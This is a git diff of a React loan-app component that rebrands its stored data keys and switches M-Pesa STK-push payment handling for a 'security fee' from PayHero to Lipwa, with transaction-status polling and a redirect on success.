@@ -1,9 +1,9 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { useNavigate } from 'react-router-dom'; // ← Added for navigation
+import { useNavigate } from 'react-router-dom';
 import toast, { Toaster } from 'react-hot-toast';
 
 const SecureLoans = ({ onBack }) => {
-  const navigate = useNavigate(); // ← Hook for programmatic navigation
+  const navigate = useNavigate();
 
   const [userData, setUserData] = useState({});
   const [phoneNumber, setPhoneNumber] = useState('');
@@ -11,18 +11,18 @@ const SecureLoans = ({ onBack }) => {
   const [isPaying, setIsPaying] = useState(false);
   const [paymentStatus, setPaymentStatus] = useState(''); // 'success', 'failed', 'cancelled'
   const [clientReference, setClientReference] = useState('');
-  const [payheroReference, setPayheroReference] = useState('');
+  const [lipwaReference, setLipwaReference] = useState(''); // ← Changed from payheroReference
   const [currentPollingStatus, setCurrentPollingStatus] = useState('');
 
   const intervalRef = useRef(null);
 
   // Load user data and generate tracking ID
   useEffect(() => {
-    const stored = JSON.parse(localStorage.getItem('okoaChapaaUser') || '{}');
+    const stored = JSON.parse(localStorage.getItem('zkpesaloansUser') || '{}');
     if (!stored.loanTrackingId) {
-      const newId = 'OKC-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+      const newId = 'zk-' + Math.random().toString(36).substr(2, 9).toUpperCase();
       stored.loanTrackingId = newId;
-      localStorage.setItem('okoaChapaaUser', JSON.stringify(stored));
+      localStorage.setItem('zkpesaloansUser', JSON.stringify(stored));
       setLoanTrackingId(newId);
     } else {
       setLoanTrackingId(stored.loanTrackingId);
@@ -31,15 +31,15 @@ const SecureLoans = ({ onBack }) => {
     setPhoneNumber(stored.mpesaPhone || '');
   }, []);
 
-  // Continuous polling using PayHero's reference
+  // Continuous polling using Lipwa's CheckoutRequestID
   useEffect(() => {
-    if (!payheroReference) return;
+    if (!lipwaReference) return;
 
     if (intervalRef.current) clearInterval(intervalRef.current);
 
     intervalRef.current = setInterval(async () => {
       try {
-        const res = await fetch(`/api/transaction-status?reference=${payheroReference}`);
+        const res = await fetch(`/api/transaction-status?reference=${lipwaReference}`);
         const data = await res.json();
 
         if (data.success && data.status) {
@@ -48,7 +48,7 @@ const SecureLoans = ({ onBack }) => {
 
           console.log(
             `[${new Date().toISOString()}] Polling → ${rawStatus} ` +
-            `| PayHero Ref: ${payheroReference} ` +
+            `| Lipwa Ref: ${lipwaReference} ` +
             `| Client Ref: ${clientReference} ` +
             `| Phone: 0${phoneNumber} ` +
             `| Amount: KES ${(userData.securityFee || userData.fee || 0).toLocaleString()} ` +
@@ -65,15 +65,13 @@ const SecureLoans = ({ onBack }) => {
               approvalTime: Date.now(),
               paymentStatus: 'success',
             };
-            localStorage.setItem('okoaChapaaUser', JSON.stringify(updatedUserData));
+            localStorage.setItem('zkpesaloansUser', JSON.stringify(updatedUserData));
 
-            // Show success toast
             toast.success('Payment Successful! Redirecting to your approval...', {
               duration: 5000,
               icon: '🎉',
             });
 
-            // Automatically navigate to Approved page after short delay
             setTimeout(() => {
               navigate('/approved');
             }, 3000);
@@ -83,21 +81,21 @@ const SecureLoans = ({ onBack }) => {
             clearInterval(intervalRef.current);
           } else if (rawStatus === 'CANCELLED') {
             setPaymentStatus('cancelled');
-            toast('Payment was cancelled. You can try again.', { icon: 'Warning', duration: 8000 });
+            toast('Payment was cancelled. You can try again.', { icon: '⚠️', duration: 8000 });
             clearInterval(intervalRef.current);
           }
         } else {
           console.warn('Unexpected polling response:', data);
         }
       } catch (err) {
-        console.error('Polling error (likely 404 or HTML page):', err);
+        console.error('Polling error:', err);
       }
     }, 2000);
 
     return () => {
       if (intervalRef.current) clearInterval(intervalRef.current);
     };
-  }, [payheroReference, phoneNumber, userData, loanTrackingId, clientReference, navigate]);
+  }, [lipwaReference, phoneNumber, userData, loanTrackingId, clientReference, navigate]);
 
   const handlePaySecurityFee = async () => {
     if (phoneNumber.length !== 9 || isPaying) return;
@@ -113,7 +111,7 @@ const SecureLoans = ({ onBack }) => {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          phoneNumber: `0${phoneNumber}`,
+          phoneNumber: `0${phoneNumber}`,        // ← Matches your Lipwa backend
           amount: userData.securityFee || userData.fee || 0,
           reference: clientRef,
         }),
@@ -121,20 +119,20 @@ const SecureLoans = ({ onBack }) => {
 
       const data = await res.json();
 
-      if (data.success && data.payheroReference) {
-        setPayheroReference(data.payheroReference);
+      if (data.success && data.lipwaReference) {
+        setLipwaReference(data.lipwaReference);
 
         toast.success('STK Push sent! Please check your phone and complete payment.', {
-          icon: 'Money',
+          icon: '💰',
           duration: 10000,
         });
 
         console.log(
           `[${new Date().toISOString()}] STK Push success | ` +
-          `Client Ref: ${clientRef} | PayHero Ref: ${data.payheroReference}`
+          `Client Ref: ${clientRef} | Lipwa Ref (CheckoutRequestID): ${data.lipwaReference}`
         );
       } else {
-        throw new Error(data.error || 'No PayHero reference returned');
+        throw new Error(data.error || 'No Lipwa reference returned');
       }
     } catch (err) {
       toast.error('Failed to initiate payment. Please try again.');
@@ -143,8 +141,11 @@ const SecureLoans = ({ onBack }) => {
       // Reset states
       setIsPaying(false);
       setClientReference('');
-      setPayheroReference('');
+      setLipwaReference('');
       setCurrentPollingStatus('');
+    } finally {
+      // Optional: reset isPaying after a short delay if needed
+      // setTimeout(() => setIsPaying(false), 1000);
     }
   };
 
@@ -155,7 +156,7 @@ const SecureLoans = ({ onBack }) => {
   const securityFee = userData.securityFee || userData.fee || 0;
 
   const getDisplayStatus = () => {
-    if (!payheroReference) return 'READY TO PAY';
+    if (!lipwaReference) return 'READY TO PAY';
     if (!currentPollingStatus) return 'WAITING FOR PAYMENT...';
     switch (currentPollingStatus) {
       case 'INITIATING': return 'SENDING REQUEST...';
@@ -166,7 +167,7 @@ const SecureLoans = ({ onBack }) => {
     }
   };
 
-  const isPollingActive = payheroReference && !paymentStatus;
+  const isPollingActive = lipwaReference && !paymentStatus;
 
   return (
     <>
@@ -183,7 +184,7 @@ const SecureLoans = ({ onBack }) => {
             padding: '16px 20px',
             maxWidth: '90vw',
           },
-          success: { icon: 'Party', style: { background: '#10B981' } },
+          success: { icon: '🎉', style: { background: '#10B981' } },
           error: { style: { background: '#EF4444' } },
         }}
       />
@@ -209,7 +210,7 @@ const SecureLoans = ({ onBack }) => {
               </p>
             </div>
 
-            {/* User Info List */}
+            {/* User Info List - unchanged */}
             <div className="space-y-4 mb-10">
               <div className="bg-gray-50 rounded-2xl p-4">
                 <p className="text-sm text-gray-600">Full Name</p>
